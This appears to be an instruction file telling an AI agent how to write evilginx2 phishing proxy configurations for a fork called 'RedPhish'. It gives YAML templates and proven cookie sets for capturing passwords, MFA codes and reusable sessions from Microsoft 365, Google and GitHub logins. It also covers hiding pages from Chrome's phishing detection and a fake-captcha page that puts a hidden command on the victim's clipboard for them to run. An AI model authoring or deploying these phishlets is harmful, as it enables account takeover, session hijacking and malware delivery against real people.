---
name: creating-phishlets
description: Author phishing phishlets for RedPhish (the evilginx2 fork in this workspace). Use when asked to create, adapt, or debug a phishlet YAML for a new identity provider, add credential capture, auth_tokens, sub_filters, token-gating, or CSD hardening. Covers this fork's specific extensions (relay lures, AES params, rewrite_urls).
---

# Creating phishlets for RedPhish

You are authoring a phishlet for the **RedPhish** fork (evilginx2 CE 3.3.0
base). Phishlets live on the node at `phishlets/` (or `<repo>/src/phishlets/` for local
testing) — they are **gitignored by design** (campaign data, never commit/push).

Scaffold with `python tools/make_phishlet.py <name> <origin-domain>` then fill in.

## YAML structure (this fork)

```yaml
name: <provider>                     # unique
proxy_hosts:                         # hosts we proxy + fabricate
  - hostname: {accounts.<BASE>.<ZONE>}   # literal template var
    phish_sub: accounts              # MUST be unique across ENABLED phishlets
    origin: https://login.provider.com
    is_landing: true
    sub_filters:                     # rewrite embedded absolute URLs
      - {hostname: login.provider.com, sub: accounts,
         search: login.provider.com, replace: accounts.{hostname}}
credentials:                         # PILLAR 1: username/password capture
  username: {key: loginfmt, search: '...', type: post}
  password:  {key: passwd,  search: '...', type: post}
  custom:                            # PILLAR 2: MFA codes / extra fields
    - {key: otp, search: '(.*)', type: post}   # typed TOTP/SMS codes (push MFA posts nothing)
login:
  domain: login.provider.com
proxy: true                        # optional: force upstream through the exit proxy
                                   # (Cloudflare-protected origins reject datacenter IPs)
auth_tokens:                         # PILLAR 3: session-completing cookies
  - domain: .provider.com
    keys: ['SESSION', 'PERSIST']
  - domain: provider.com             # host-only cookies (__Host-*): group WITHOUT the dot
    keys: ['__Host-session']
```

### The three capture pillars — get all three or the phishlet is a toy

1. **credentials** — where the username/password appear in POST bodies. Inspect the real
   login flow (browser devtools → copy-as-cURL). Regex allowed when values hide inside
   JSON-RPC blobs (Google: email extracted by regex from the `f.req` POST field);
   SPA logins POST JSON — use `type: json` with a body regex (Atlassian:
   `"username"\s*:\s*"([^"]+)"`).
2. **custom** — MFA codes worth logging: `{key: otp, search, type}` — typed TOTP/SMS
   codes only (push MFA like GitHub Mobile posts no field).
3. **auth_tokens** — the cookie set that makes the session REUSABLE. Test by importing
   into a fresh browser: no login wall = right set. Proven sets: ms365 consumer =
   `WLSSC`, ms365 work = `ESTSAUTHPERSISTENT` (login.live.com), google = the
   `.google.com` family (`SID`, `__Secure-1PSID`, `__Secure-3PSID`, `SAPISID`,
   `HSID`, `SSID`, `APISID`), github = host-only `__Host-user_session_same_site` +
   `_gh_sess` (group `github.com`, NO dot). Track tokens across ALL auth domains
   the flow visits.

## Hard rules (each one caused a real incident)

| Rule | Why |
|---|---|
| `phish_sub` unique across **enabled** phishlets on one base domain | host→phishlet map is a Go map; collisions = random cross-redirects between flows |
| `general.domain` == current base domain | changing only phishlet hostnames leaves sub-filters rendering dead absolute URLs → victim JS aborts mid-flow |
| Rewrite **both directions** | every absolute URL origin-embedded must map to the fabricated host and back; test a FULL flow, not just landing |
| Token values in `search` regexes must be anchored enough not to match URL params | e.g. hostname checks in code must use parsed hostname, never substring over the whole URL (a `continue=` param once caused false "done") |
| Autocomplete/hidden fields | capture rules must target the VISIBLE field — hidden prefilled inputs (e.g. hiddenPassword) silently match first and capture empty values |
| `login.domain` must be an exact `orig_sub`+`domain` combination from `proxy_hosts` | validator rejects it otherwise (aws: `signin` + `amazon.com` = `signin.amazon.com` ≠ `signin.aws.amazon.com` — use domain `aws.amazon.com`) |
| Host-only cookies get a **no-dot** auth_tokens group | `Set-Cookie` without a `Domain` attr (all `__Host-*`) lands on the bare hostname; lookup is exact-string — `.github.com` groups never see them (GitHub lesson: session = `__Host-user_session_same_site` on `github.com`) |
| Cloudflare-protected origin → `proxy: true` | CF challenges datacenter egress IPs in a loop the victim can never clear; the flag forces the phishlet's upstream through the residential exit |
| `auth_urls` must match POST-LOGIN paths only | the request-side hook finishes a session on URL match (now token-gated, but keep URLs post-login anyway) — a landing/root path in the list once completed a session on arrival and broke the flow |
| Verify the token list against a LIVE login before shipping | providers silently change cookies — GitHub dropped domain-wide `user_session` entirely; make non-critical cookies `:opt` so completion can't hang |

## Per-phishlet botguard JA4 exceptions

`bg_ja4_allow` (optional YAML list of JA4 prefixes) whitelists corporate
TLS-inspection variants for THIS phishlet only, OR-merged with the node-level
`-bg-ja4` flag list — hot-reload applies immediately. When a victim network's
SWG (Umbrella/Palo Alto) re-terminates TLS, victims arrive with the appliance's
fingerprint; read the exact variant from the node journal
(`botguard: JA4 not in allowlist ... <ja4>`) and add it. Each SWG profile yields
a distinct but stable variant (field-observed: two profiles one digit apart).

## ClickFix gate (fake captcha + clipboard payload)

Optional per-phishlet section that serves a social-engineering
"verification" page which silently copies a command to the victim's
clipboard and instructs them to run it (Win+R → Ctrl+V → Enter):

```yaml
clickfix:
  template: cloudflare-turnstile     # cloudflare-turnstile / windows-fix / recaptcha / aws-captcha
  command: "<payload>"               # base64-encoded in the page source
  position: before                   # before = pre-login, after = post-capture
```

Templates in `clickfix/templates/` (gitignored, deployed to the node like
phishlets). Hardened against content classification: zero sensitive text
in the initial DOM, base64 payload, brand lazy-reveal, randomized
fingerprint. Placeholders: `{command_b64}` (preferred), `{command}`
(legacy), `{redirect_url}` (auto-substituted).

See phishlet-authoring docs for the full detection-hardening reference.

## Lure options (fork extensions)

- **token-gate** (default via API): lure carries `token: auto`; requests without
  `?t=<token>` get a 302 to `redirect_url`. Always set a plausible benign redirect
  (product marketing page). NEVER reuse tokens across campaigns; never log them.
- **relay: true** (Google-type targets with origin-bound anti-bot): the lure serves the
  real-browser relay page instead of a MITM session — see
  `docs/google-relay.md` + `tools/relay/`. Do NOT try to MITM accounts.google.com;
  it is proven impossible (botguard is origin-bound).

## CSD hardening (Chrome client-side detection) — required on password hosts

Add to the landing phishlet's `js_inject` (patterns proven in ms365/google):

1. **Password DOM disguise**: replace `input[type=password]` with `type=text` +
   `-webkit-text-security:disc`, keep a MutationObserver re-applying it, submit value
   unchanged. The DOM then contains no password field for CSPD to classify.
2. **Brand lazy-reveal**: hide logo/brand assets at load (style class), remove on first
   `pointermove/keydown/touchstart`. The classifier screenshots before interaction.

Verify like-for-like: SB-enabled Chrome, full flow, no Dangerous flag — on a **burner**
domain, never the campaign one.

## Testing procedure (in order)

1. YAML loads: `phishlets reload` via console/MCP; no parse errors in log.
2. Render through the **lure with `?t=<token>`** in one browser session —
   NEVER by visiting the landing path directly: a direct visit has no session,
   so POSTs are not monitored (capture silently missing) and a non-allowlisted
   headless JA4 gets the botguard decoy redirect, which looks like a broken
   phishlet. The token-gate param is `t`, not `token`.
3. Full flow with a test account: identifier → password → MFA → landed app.
   Push-type MFA (GitHub Mobile) posts no OTP field — `custom: otp` only fires
   on typed codes; that is expected, not a bug.
4. `sessions` shows capture with all 3 pillars; export cookies, replay in a
   browser (MCP `open_session`), confirm no login wall.
5. Detection check from a burner domain; only then campaign. Pause test lures
   with `PUT /lures/{id}` `{"paused": <unix-ts>}` — the field is an int64
   timestamp (pause UNTIL), not a boolean; `0` resumes.

## Reference phishlets on the node

`ms365.yaml` (gold standard: 15 proxy_hosts, telemetry hosts, CSD hardening,
consumer + work token sets), `github.yaml` (**verified E2E** — the modern
minimal pattern: auto_filter rewrites, telemetry `collector` proxied not
blocked, host-only `__Host-` token group) and `google.yaml` (relay-based).
Read them before writing a new one.

## Gotchas

- Some providers need extra telemetry hosts allow-listed in `proxy_hosts` or
  their JS dies silently (Microsoft play.googleapis, Google play/gapi/ogs
  hosts, GitHub collector.github.com — always PROXY telemetry, never block it).
- Unknown SNI = silent drop = browser hang (hostname typo, not an error page).
- `301/302 to /` on first hop is NORMAL for ms365 (hop 1 of the OAuth dance).
- Empty password capture can be correct (passwordless accounts).
- Cloudflare-protected logins (gitlab/claude/chatgpt) render the CF challenge
  ON the phishing host for headless browsers — that is expected; verify with a
  real browser before declaring the phishlet broken.
- `auto_filter` defaults to ON for every proxy host — explicit `sub_filters`
  are only needed for special-case rewrites.
